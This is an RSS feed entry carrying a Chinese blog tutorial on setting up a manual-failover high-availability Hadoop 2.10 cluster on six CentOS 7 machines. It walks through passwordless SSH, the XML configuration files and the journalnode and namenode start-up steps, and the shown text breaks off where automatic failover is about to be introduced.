<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>centos7搭建hadoop2.10高可用(HA) - 七星6609</title>
<link>http://www.cnblogs.com/qixing/p/12252111.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qixing/p/12252111.html</guid>
<description>&lt;p&gt;本篇介绍在centos7中搭建hadoop2.10高可用集群，首先准备6台机器：2台nn(namenode);4台dn(datanode)；3台jns(journalnodes)&lt;/p&gt;
&lt;table border=&quot;0&quot; align=&quot;left&quot;&gt;&lt;tbody readability=&quot;6.5&quot;&gt;&lt;tr&gt;&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;hostname&lt;/td&gt;
&lt;td&gt;进程&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;192.168.30.141&lt;/td&gt;
&lt;td&gt;s141&lt;/td&gt;
&lt;td&gt;nn1（namenode），zkfc（DFSZKFailoverController），zk（QuorumPeerMain）&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;192.168.30.142&lt;/td&gt;
&lt;td&gt;s142&lt;/td&gt;
&lt;td&gt;dn（datanode）, jn（journalnode），zk（QuorumPeerMain）&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;192.168.30.143&lt;/td&gt;
&lt;td&gt;s143&lt;/td&gt;
&lt;td&gt;dn（datanode）, jn（journalnode），zk（QuorumPeerMain）&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;192.168.30.144&lt;/td&gt;
&lt;td&gt;s144&lt;/td&gt;
&lt;td&gt;dn（datanode）, jn（journalnode）&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;192.168.30.145&lt;/td&gt;
&lt;td&gt;s145&lt;/td&gt;
&lt;td&gt;dn（datanode）&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;192.168.30.146&lt;/td&gt;
&lt;td&gt;s146&lt;/td&gt;
&lt;td&gt;nn2（namenode），zkfc（DFSZKFailoverController）&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;




&lt;p&gt;各个机器 jps进程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202232922662-645497064.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;由于本人使用的是vmware虚拟机，所以在配置好一台机器后，使用克隆，克隆出剩余机器，并修改hostname和IP，这样每台机器配置就都统一了每台机器配置 添加hdfs用户及用户组，配置jdk环境，安装hadoop，本次搭建高可用集群在hdfs用户下，可以参照：&lt;a href=&quot;https://www.cnblogs.com/qixing/p/12113732.html&quot; target=&quot;_blank&quot;&gt;centos7搭建hadoop2.10伪分布模式&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下面是安装高可用集群的一些步骤和细节：&lt;/p&gt;
&lt;p&gt;1.设置每台机器的hostname 和 hosts&lt;/p&gt;
&lt;p&gt;修改hosts文件，hosts设置有后可以使用hostname访问机器，这样比较方便，修改如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;127.0&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;&lt;span&gt; locahost
&lt;/span&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;30.141&lt;/span&gt;&lt;span&gt; s141
&lt;/span&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;30.142&lt;/span&gt;&lt;span&gt; s142
&lt;/span&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;30.143&lt;/span&gt;&lt;span&gt; s143
&lt;/span&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;30.144&lt;/span&gt;&lt;span&gt; s144
&lt;/span&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;30.145&lt;/span&gt;&lt;span&gt; s145
&lt;/span&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;30.146&lt;/span&gt; s146
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2.设置ssh无密登录，由于s141和s146都为namenode，所以要将这两台机器无密登录到所有机器，最好hdfs用户和root用户都设置无密登录&lt;/p&gt;
&lt;p&gt;我们将s141设置为nn1，s146设置为nn2，就需要s141、s146能够通过ssh无密登录到其他机器，这样就需要在s141和s146机器hdfs用户下生成密钥对，并将s141和s146公钥发送到其他机器放到~/.ssh/authorized_keys文件中，更确切的说要将公钥添加的所有机器上（包括自己）&lt;/p&gt;
&lt;p&gt;在s141和s146机器上生成密钥对：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
ssh-keygen -t rsa -P '' -f ~/.ssh/id_rsa
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;将id_rsa.pub文件内容追加到s141-s146机器的/home/hdfs/.ssh/authorized_keys中，现在其他机器暂时没有authorized_keys文件，我们就将id_rsa.pub更名为authorized_keys即可，如果其他机器已存在authorized_keys文件可以将id_rsa.pub内容追加到该文件后，远程复制可以使用scp命令：&lt;/p&gt;
&lt;p&gt;s141机器公钥复制到其他机器&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
scp id_rsa.pub hdfs@s141:/home/hdfs/.ssh/&lt;span&gt;id_rsa_141.pub
scp id_rsa.pub hdfs@s142:&lt;/span&gt;/home/hdfs/.ssh/&lt;span&gt;id_rsa_141.pub
scp id_rsa.pub hdfs@s143:&lt;/span&gt;/home/hdfs/.ssh/&lt;span&gt;id_rsa_141.pub
scp id_rsa.pub hdfs@s144:&lt;/span&gt;/home/hdfs/.ssh/&lt;span&gt;id_rsa_141.pub
scp id_rsa.pub hdfs@s145:&lt;/span&gt;/home/hdfs/.ssh/&lt;span&gt;id_rsa_141.pub
scp id_rsa.pub hdfs@s146:&lt;/span&gt;/home/hdfs/.ssh/id_rsa_141.pub
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;s146机器公钥复制到其他机器&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
scp id_rsa.pub hdfs@s141:/home/hdfs/.ssh/&lt;span&gt;id_rsa_146.pub
scp id_rsa.pub hdfs@s142:&lt;/span&gt;/home/hdfs/.ssh/&lt;span&gt;id_rsa_146.pub
scp id_rsa.pub hdfs@s143:&lt;/span&gt;/home/hdfs/.ssh/&lt;span&gt;id_rsa_146.pub
scp id_rsa.pub hdfs@s144:&lt;/span&gt;/home/hdfs/.ssh/&lt;span&gt;id_rsa_146.pub
scp id_rsa.pub hdfs@s145:&lt;/span&gt;/home/hdfs/.ssh/&lt;span&gt;id_rsa_146.pub
scp id_rsa.pub hdfs@s146:&lt;/span&gt;/home/hdfs/.ssh/id_rsa_146.pub
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在每台机器上可以使用cat将秘钥追加到authorized_keys文件&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
cat id_rsa_141.pub &amp;gt;&amp;gt; authorized_keys
&lt;/pre&gt;
&lt;pre&gt;
cat id_rsa_146.pub &amp;gt;&amp;gt; authorized_keys
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时authorized_keys文件权限需要改为644(注意，经常会因为这个权限问题导致ssh无密登录失败)&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
chmod 644 authorized_keys
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3.配置hadoop配置文件（${hadoop_home}/etc/hadoop/）&lt;/p&gt;
&lt;p&gt;配置细节：&lt;/p&gt;
&lt;p&gt;注意： s141和s146具有完全一致的配置，尤其是ssh.&lt;/p&gt;
&lt;p&gt;1) 配置nameservice&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[hdfs-&lt;span&gt;site.xml]
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.nameservices&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;mycluster&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;br/&gt;2) dfs.ha.namenodes.[nameservice ID]&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
[hdfs-&lt;span&gt;site.xml]
&amp;lt;!-- myucluster下的名称节点两个id --&amp;gt;
&amp;lt;property&amp;gt;
　　&amp;lt;name&amp;gt;dfs.ha.namenodes.mycluster&amp;lt;/name&amp;gt;
　　&amp;lt;value&amp;gt;nn1,nn2&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3) dfs.namenode.rpc-address.[nameservice ID].[name node ID] &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
[hdfs-&lt;span&gt;site.xml]
配置每个nn的rpc地址。
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.namenode.rpc-address.mycluster.nn1&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;s141:8020&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.namenode.rpc-address.mycluster.nn2&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;s146:8020&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;4) dfs.namenode.http-address.[nameservice ID].[name node ID]&lt;br/&gt;配置webui端口&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
[hdfs-&lt;span&gt;site.xml]
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.namenode.http-address.mycluster.nn1&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;s141:50070&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.namenode.http-address.mycluster.nn2&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;s146:50070&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;5) dfs.namenode.shared.edits.dir&lt;br/&gt;名称节点共享编辑目录.选择三台journalnode节点，这里选择s142、s143、s144三台机器&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[hdfs-&lt;span&gt;site.xml]
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.namenode.shared.edits.dir&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;qjournal://s142:8485;s143:8485;s144:8485/mycluster&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;6) dfs.client.failover.proxy.provider.[nameservice ID]&lt;br/&gt;配置一个HA失败转移的java类(改配置是固定的)，client使用它判断哪个节点是激活态。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[hdfs-&lt;span&gt;site.xml]
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.client.failover.proxy.provider.mycluster&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;7) dfs.ha.fencing.methods&lt;br/&gt;脚本列表或者java类，在容灾保护激活态的nn.&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
[hdfs-&lt;span&gt;site.xml]
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.ha.fencing.methods&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;sshfence&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;

&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.ha.fencing.ssh.private-key-files&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;/home/hdfs/.ssh/id_rsa&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;8) fs.defaultFS &lt;br/&gt;配置hdfs文件系统名称服务。这里的mycluster为上面配置的dfs.nameservices　　&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
[core-&lt;span&gt;site.xml]
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;fs.defaultFS&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;hdfs://mycluster&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;9) dfs.journalnode.edits.dir&lt;br/&gt;配置JN存放edit的本地路径。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[hdfs-&lt;span&gt;site.xml]
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.journalnode.edits.dir&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;/home/hdfs/hadoop/journal&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;完整配置文件：&lt;/p&gt;
&lt;p&gt;core-site.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;?xml version=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; encoding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;?&amp;gt;
&amp;lt;?xml-stylesheet type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/xsl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; href=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;configuration.xsl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;?&amp;gt;

&amp;lt;configuration&amp;gt;
    &amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;fs.defaultFS&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;hdfs:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;mycluster/&amp;lt;/value&amp;gt;&lt;/span&gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;hadoop.tmp.dir&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;/home/hdfs/hadoop&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;hdfs-site.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&amp;lt;?xml version=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; encoding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;?&amp;gt;
&amp;lt;?xml-stylesheet type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/xsl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; href=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;configuration.xsl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;?&amp;gt;

&amp;lt;configuration&amp;gt;
    &amp;lt;property&amp;gt;
    　　&amp;lt;name&amp;gt;dfs.replication&amp;lt;/name&amp;gt;
    　　&amp;lt;value&amp;gt;&lt;span&gt;3&lt;/span&gt;&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
    　　&amp;lt;name&amp;gt;dfs.hosts&amp;lt;/name&amp;gt;
    　　&amp;lt;value&amp;gt;/opt/soft/hadoop/etc/dfs.include.txt&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
    　　&amp;lt;name&amp;gt;dfs.hosts.exclude&amp;lt;/name&amp;gt;
    　　&amp;lt;value&amp;gt;/opt/soft/hadoop/etc/dfs.hosts.exclude.txt&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.nameservices&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;mycluster&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.ha.namenodes.mycluster&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;nn1,nn2&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.namenode.rpc-address.mycluster.nn1&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;s141:&lt;span&gt;8020&lt;/span&gt;&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.namenode.rpc-address.mycluster.nn2&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;s146:&lt;span&gt;8020&lt;/span&gt;&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.namenode.http-address.mycluster.nn1&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;s141:&lt;span&gt;50070&lt;/span&gt;&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.namenode.http-address.mycluster.nn2&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;s146:&lt;span&gt;50070&lt;/span&gt;&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.namenode.shared.edits.dir&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;qjournal:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;s142:8485;s143:8485;s144:8485/mycluster&amp;lt;/value&amp;gt;&lt;/span&gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.client.failover.proxy.provider.mycluster&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.ha.fencing.methods&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;sshfence&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;

    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.ha.fencing.ssh.&lt;span&gt;private&lt;/span&gt;-key-files&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;/home/hdfs/.ssh/id_rsa&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
      &amp;lt;name&amp;gt;dfs.journalnode.edits.dir&amp;lt;/name&amp;gt;
      &amp;lt;value&amp;gt;/home/hdfs/hadoop/journal&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;mapred-site.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&amp;lt;?xml version=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;?&amp;gt;
&amp;lt;?xml-stylesheet type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/xsl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; href=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;configuration.xsl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;?&amp;gt;

&amp;lt;configuration&amp;gt;
   &amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;mapreduce.framework.name&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;yarn&amp;lt;/value&amp;gt;
   &amp;lt;/property&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;yarn-site.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?xml version=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;?&amp;gt;

&amp;lt;configuration&amp;gt;

&amp;lt;!-- Site specific YARN configuration properties --&amp;gt;
    &amp;lt;property&amp;gt;
    　　&amp;lt;name&amp;gt;yarn.resourcemanager.hostname&amp;lt;/name&amp;gt;
    　　&amp;lt;value&amp;gt;s141&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
     　　&amp;lt;name&amp;gt;yarn.nodemanager.aux-services&amp;lt;/name&amp;gt;
    　　&amp;lt;value&amp;gt;mapreduce_shuffle&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;4. 部署细节&lt;/p&gt;
&lt;p&gt; 1）在jn节点分别启动jn进程（s142，s143，s144）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
hadoop-daemon.sh start journalnode
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 2）启动jn之后，在两个NN之间进行disk元数据同步&lt;/p&gt;
&lt;p&gt;　　a)如果是全新集群，先format文件系统,只需要在一个nn上执行。&lt;br/&gt;　　[s141|s146]&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
hadoop namenode -format
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　b)如果将非HA集群转换成HA集群，复制原NN的metadata到另一个NN上.&lt;/p&gt;
&lt;p&gt;　　　　1.步骤一&lt;br/&gt;　　　　在s141机器上，将hadoop数据复制到s146对应的目录下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
scp -r /home/hdfs/hadoop/dfs hdfs@s146:/home/hdfs/hadoop/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　　　2.步骤二&lt;br/&gt;　　　　在新的nn(未格式化的nn，我这里是s146)上运行以下命令，实现待命状态引导。注意：需要s141namenode为启动状态（可以执行：hadoop-daemon.sh start namenode ）。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
hdfs namenode -bootstrapStandby
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　　　如果没有启动s141名称节点，就会失败，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202162741417-1811882439.png&quot; alt=&quot;&quot; width=&quot;1096&quot; height=&quot;520&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　　　启动s141名称节点后，在s141上执行命令&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
hadoop-daemon.sh start namenode
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　　　然后在执行待命引导命令，注意：提示是否格式化，选择N，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202163145210-1175292424.png&quot; alt=&quot;&quot; width=&quot;1103&quot; height=&quot;507&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;　　　　&lt;/em&gt;3. 步骤三&lt;/p&gt;
&lt;p&gt;　　　　在其中一个NN上执行以下命令，完成edit日志到jn节点的传输。&lt;em&gt;&lt;br/&gt;&lt;/em&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
hdfs namenode -initializeSharedEdits
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　　　如果执行过程中报：java.nio.channels.OverlappingFileLockException  错误：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202163848520-872532291.png&quot; alt=&quot;&quot; width=&quot;973&quot; height=&quot;324&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　　　　　说明namenode在启动中，需要停掉namenode节点(hadoop-daemon.sh stop namenode)&lt;/p&gt;
&lt;p&gt;　　　　　　执行完后查看s142,s143,s144是否有edit数据，这里查看生产了mycluster目录，里面有编辑日志数据，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202164144541-2140404613.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　　　　　4.步骤四&lt;/p&gt;
&lt;p&gt;　　　　　　启动所有节点.&lt;/p&gt;
&lt;p&gt;　　　　　　在s141上启动名称节点和所有数据节点：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
hadoop-&lt;span&gt;daemon.sh start namenode
hadoop&lt;/span&gt;-daemons.sh start datanode
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　　　　　在s146上启动名称节点&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
hadoop-daemon.sh start namenode
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 此时在浏览器中访问  &lt;a href=&quot;http://192.168.30.141:50070/&quot;&gt;http://192.168.30.141:50070/&lt;/a&gt; 和 &lt;a href=&quot;http://192.168.30.141:50070/&quot;&gt;http://192.168.30.146:50070/&lt;/a&gt; 你会发现两个namenode都为standby&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202170301291-1119553112.png&quot; alt=&quot;&quot; width=&quot;759&quot; height=&quot;185&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 这时需要手动使用命令将其中一个切换为激活态，这里将s141（nn1）设置为active&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
hdfs haadmin -transitionToActive nn1
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时s141就为active&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202170608456-217277348.png&quot; alt=&quot;&quot; width=&quot;790&quot; height=&quot;233&quot;/&gt;&lt;/p&gt;
&lt;p&gt; hdfs haadmin常用命令：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/480564/202002/480564-20200202170725542-1192300066.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至此手动容灾高可用配置完成，但是这种方式不智能，不能够自动感知容灾，所以下面介绍自动容灾配置&lt;/p&gt;
